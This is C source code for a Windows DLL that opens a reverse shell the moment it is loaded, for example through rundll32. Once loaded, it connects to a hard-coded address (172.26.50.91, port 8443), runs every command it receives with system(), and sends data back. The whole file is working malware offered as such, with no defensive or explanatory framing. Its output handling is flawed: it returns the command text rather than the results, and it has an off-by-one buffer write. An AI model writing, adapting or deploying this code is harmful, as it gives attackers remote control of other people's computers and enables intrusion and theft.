#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 8443
#define IP "172.26.50.91"

// Main reverse shell function
void reverse_shell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[1024];
    int bytes_received;

    // Initialize winsock
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        printf("WSAStartup failed with error: %d\n", WSAGetLastError());
        return;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("Socket creation failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return;
    }

    // Set up server info
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    // Connect to the server
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("Connection failed with error: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Redirect stdin, stdout, stderr to the socket
    while (1) {
        bytes_received = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received == SOCKET_ERROR) {
            printf("Recv failed with error: %d\n", WSAGetLastError());
            break;
        }

        // If data was received, execute it
        buffer[bytes_received] = '\0';
        system(buffer);  // Execute received commands

        // Send output back
        bytes_received = send(sock, buffer, bytes_received, 0);
        if (bytes_received == SOCKET_ERROR) {
            printf("Send failed with error: %d\n", WSAGetLastError());
            break;
        }
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
}

// DLL entry point (required for rundll32)
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        reverse_shell(); // Execute the reverse shell when the DLL is loaded
    }
    return TRUE;
}
